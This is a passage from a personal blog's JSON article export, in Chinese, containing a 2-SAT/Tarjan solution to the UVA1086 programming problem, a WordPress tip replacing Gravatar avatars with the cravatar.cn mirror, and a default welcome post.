dfs(i);\n\t}\n}\nvoid dfs(int x){\n\tlow[x]=dfn[x]=++_time;\n\ts.push(x);\n\tlock[x]=true;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(!dfn[to]){\n\t\t\tdfs(to);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t}else if(lock[to]) low[x]=min(low[x],dfn[to]);\n\t}\n\tif(low[x]==dfn[x]){\n\t\ttot++;\n\t\twhile(true){\n\t\t\tint k=s.top();s.pop();\n\t\t\tid[k]=tot;\n\t\t\tlock[k]=false;\n\t\t\tif(k==x) break;\n\t\t}\n\t}\n}\n```\n\n这里在 dfs 之前把 $low$，$dfn$ 等变量都重置了，因为我们不止会用一次 $tarjan$，这个在后面会说。\n\n然后单独写一个函数判断是否有解：\n\n```cpp\ninline bool check(){\n\tfor(int i=1;i<=n;i++){\n\t\tif(id[i]==id[i+n]){\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}\n```\n\n然后我们将最后的可能的一种答案存放在 $ans$ 数组中，注意数组是 `int` 类型的，这个后面也会说。\n\n```cpp\nfor(int i=1;i<=n;i++){\n\tif(id[i+n]<id[i]) ans[i]=true;\n\telse ans[i]=0;\n}\n```\n\n然后题目和一般的 $2-SAT$ 不同，他不让你求一种可能结果，而是对于一些可以通过，也可以否定的提案输出 `?`，如何判断一个提案是 `?` 而不是一个确定的结果呢？\n\n我们可以这样，如果求得的一个可能的答案为 `y`，那么我们加一条从 $true$ 到 $false$ 的边，即强制选择 $false$。再跑一遍 $tarjan$，如果还有解，那么说明这个提案否定和通过都可以；如果无解，那么说明这个提案最后必须是通过。\n\n```cpp\n//判断是否可以为问号\nfor(int i=1;i<=n;i++){\n\tif(ans[i]==true){\n\t\tmust(i,'n');\n\t\ttarjan();\n\t\tif(check()) ans[i]=3;\n\t}else{\n\t\tmust(i,'y');\n\t\ttarjan();\n\t\tif(check()) ans[i]=3;\n\t}\n\tredo();\n}\n```\n\n$ans$ 数组中 $0$ 代表必须是否定，$1$ 代表必须是肯定，$3$ 代表都可以。\n\n注意这里有个 $redo$ 函数，用来撤销用于判断一个提案是否为 `?` 时建的边：\n\n```cpp\ninline void redo(){\n\thead[edge[size].from]=edge[size].next;\n\tsize--;\n}\n```\n\n建图部分：\n\n```cpp\nstruct Edge{\n\tint from,next,to;\n} edge[15*500];\nint head[201];\nint size;\ninline void add(int u,int v){\n\tsize++;\n\tedge[size].to=v;\n\tedge[size].next=head[u];\n\tedge[size].from=u;\n\thead[u]=size;\n}\ninline void redo(){\n\thead[edge[size].from]=edge[size].next;\n\tsize--;\n}\n```\n\n（注意 $edge$ 数组的大小。为了 $redo$ 操作，$Edge$ 结构体中新增了一个成员：$from$）\n\n最后根据 $ans$ 数组输出。\n\n## 完整代码\n\n```cpp\n#include<iostream>\n#include<cstring>\n#include<stack>\n#include<cstdio>\n#define maxn 201\nusing namespace std;\n\nstruct Edge{\n\tint from,next,to;\n} edge[15*500];\nint head[201];\nint size;\ninline void add(int u,int v){\n\tsize++;\n\tedge[size].to=v;\n\tedge[size].next=head[u];\n\tedge[size].from=u;\n\thead[u]=size;\n}\ninline void redo(){\n\thead[edge[size].from]=edge[size].next;\n\tsize--;\n}\n\nint n;\nstack<int> s;\nint low[maxn],dfn[maxn];\nint _time;\nbool lock[maxn];\nint id[maxn];\nint tot;\nvoid dfs(int x);\nvoid tarjan(){\n\tmemset(low,0,sizeof(low));\n\tmemset(dfn,0,sizeof(dfn));\n\t_time=0;\n\tmemset(lock,0,sizeof(lock));\n\tmemset(id,0,sizeof(id));\n\ttot=0;\n\tfor(int i=1;i<=n*2;i++){\n\t\tif(!dfn[i]) dfs(i);\n\t}\n}\nvoid dfs(int x){\n\tlow[x]=dfn[x]=++_time;\n\ts.push(x);\n\tlock[x]=true;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(!dfn[to]){\n\t\t\tdfs(to);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t}else if(lock[to]) low[x]=min(low[x],dfn[to]);\n\t}\n\tif(low[x]==dfn[x]){\n\t\ttot++;\n\t\twhile(true){\n\t\t\tint k=s.top();s.pop();\n\t\t\tid[k]=tot;\n\t\t\tlock[k]=false;\n\t\t\tif(k==x) break;\n\t\t}\n\t}\n}\n\ninline void must(int e,char a){\n\tif(a=='y'){\n\t\tadd(e,e+n);\n\t}else{\n\t\tadd(e+n,e);\n\t}\n}\n\n\ninline void op(int e1,char a1,int e2,char a2){\n\tif(a1=='y'){\n\t\tif(a2=='y') add(e1,e2+n);\n\t\telse add(e1,e2);\n\t}else{\n\t\tif(a2=='y') add(e1+n,e2+n);\n\t\telse add(e1+n,e2);\n\t}\n}\n\nint ans[101];\ninline bool check(){\n\tfor(int i=1;i<=n;i++){\n\t\tif(id[i]==id[i+n]){\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}\ninline void clear(){\n\tmemset(edge,0,sizeof(edge));\n\tmemset(head,0,sizeof(head));\n\tsize=0;\n}\ninline void subtask(int cas,int b,int m){\n\tclear();\n\tn=b;\n\tfor(int i=1;i<=m;i++){\n\t\tint k,e1,e2,e3,e4;\n\t\tchar a1,a2,a3,a4;\n\t\tcin>>k;\n\t\tif(k==1){\n\t\t\tcin>>e1>>a1;\n\t\t\tmust(e1,a1);\n\t\t}\n\t\tif(k==2){\n\t\t\tcin>>e1>>a1>>e2>>a2;\n\t\t\tmust(e1,a1);\n\t\t\tmust(e2,a2);\n\t\t}\n\t\tif(k==3){\n\t\t\tcin>>e1>>a1>>e2>>a2>>e3>>a3;\n\t\t\top(e1,a1,e2,a2);\n\t\t\top(e1,a1,e3,a3);\n\n\t\t\top(e2,a2,e1,a1);\n\t\t\top(e2,a2,e3,a3);\n\n\t\t\top(e3,a3,e2,a2);\n\t\t\top(e3,a3,e1,a1);\n\t\t}\n\t\tif(k==4){\n\t\t\tcin>>e1>>a1>>e2>>a2>>e3>>a3>>e4>>a4;\n\t\t\top(e1,a1,e2,a2);\n\t\t\top(e1,a1,e3,a3);\n\t\t\top(e1,a1,e4,a4);\n\n\t\t\top(e2,a2,e1,a1);\n\t\t\top(e2,a2,e3,a3);\n\t\t\top(e2,a2,e4,a4);\n\n\t\t\top(e3,a3,e2,a2);\n\t\t\top(e3,a3,e1,a1);\n\t\t\top(e3,a3,e4,a4);\n\n\t\t\top(e4,a4,e2,a2);\n\t\t\top(e4,a4,e1,a1);\n\t\t\top(e4,a4,e3,a3);\n\t\t}\n\t}\n\ttarjan();\n\tif(!check()){\n\t\tcout<<\"Case \"<<cas<<\": impossible\"<<endl;\n\t\treturn;\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tif(id[i+n]<id[i]) ans[i]=true;\n\t\telse ans[i]=0;\n\t}\n\t//判断是否可以为问号\n\tfor(int i=1;i<=n;i++){\n\t\tif(ans[i]==true){\n\t\t\tmust(i,'n');\n\t\t\ttarjan();\n\t\t\tif(check()) ans[i]=3;\n\t\t}else{\n\t\t\tmust(i,'y');\n\t\t\ttarjan();\n\t\t\tif(check()) ans[i]=3;\n\t\t}\n\t\tredo();\n\t}\n\tcout<<\"Case \"<<cas<<\": \";\n\tfor(int i=1;i<=n;i++){\n\t\tif(ans[i]==0) cout<<\"n\";\n\t\telse if(ans[i]==1) cout<<\"y\";\n\t\telse if(ans[i]==3) cout<<\"?\";\n\t}\n\tcout<<endl;\n}\n\nint main(){\n\tint cas=0;\n\twhile(true){\n\t\tcas++;\n\t\tint b,m;\n\t\tcin>>b>>m;\n\t\tif(b==0&&m==0) return 0;\n\t\telse subtask(cas,b,m);\n\t}\n\treturn 0;\n}\n```\n\n","summary":"UVA1086 The Ministers' Major Mess的题解","key":["题解","uva1086","tarjan","2sat"],"tags":[],"path":["算法竞赛","题解","UVA1086 The Ministers' Major Mess.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/07/16.png","recommend":false,"status":"published"},{"type":"Article","title":"wordpress打开速度过慢","id":"wordpress-low-speed","createTime":"2022-02-27T05:48:00.000Z","updateTime":"2025-09-05T13:34:05.006Z","content":"\n使用wordpress搭建博客。发现打开网站，尤其是进入网站后台进行管理时浏览器的标签页上一直在转圈，网页加载速度非常慢。而服务器本身网速并不慢。\n\n## 原因\n\n进入浏览器-F12-network，发现网页一直在等待一个来自gravatar.com的文件加载完毕。等待数十秒后加载失败，整个网页瞬间完成加载。\n\n经过搜索得知，wordpress上的所有头像都来自gravatar.com这个网站。gravatar.com可以根据邮箱来获取到相应的头像（比如你留下的是qq邮箱，就会直接使用你的qq的头像）。而这个网站应该是被墙了，无法正常打开。也是因为此从而拖慢了整个网页加载的速度。\n\n## 解决方法\n\n在wordpress后台，点击“外观”->“主题文件编辑器”\n\n![](https://www.caiwen.work/wp-content/uploads/2022/02/w1.png)\n\n在“主题文件”一栏中点击“模板函数”\n\n![](https://www.caiwen.work/wp-content/uploads/2022/02/w2.png)\n\n在最下面加上如下的代码\n\n![](https://www.caiwen.work/wp-content/uploads/2022/02/w3.png)\n\n```php\n// 替换 WordPress Gravatar 为国内头像源\nfunction theme_get_ssl_avatar(avatar) {avatar = str_replace(array(\"www.gravatar.com\", \"0.gravatar.com\", \"1.gravatar.com\", \"2.gravatar.com\", \"secure.gravatar.com\"), \"cravatar.cn\", avatar);\n\treturn avatar;\n}\nadd_filter('get_avatar', 'theme_get_ssl_avatar');\n```\n\n这样我们就替换为gravatar的国内镜像.\n\n","summary":"通过更改wordpress的头像源可以加快页面的加载速度","key":["wordpress","慢","加载"],"tags":[],"path":["建站","wordpress打开速度过慢.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/02/w1.png","recommend":false,"status":"published"},{"type":"Article","title":"你好，世界！","id":"hello","createTime":"2022-02-25T10:14:00.000Z","updateTime":"2025-09-05T13:34:05.411Z","content":"\n欢迎使用WordPress。这是您的第一篇文章。编辑或删除它，然后开始写作吧！\n\n","summary":"Caiwen的博客的第一个文章。","key":[],"tags":[{"value":"初始文章","color":"success"}],"path":["你好，世界！.md"],"background":"http://pic.caiwen.work/i/2025/01/23/67923419d4d49.jpeg","recommend":false,"status":"published"}]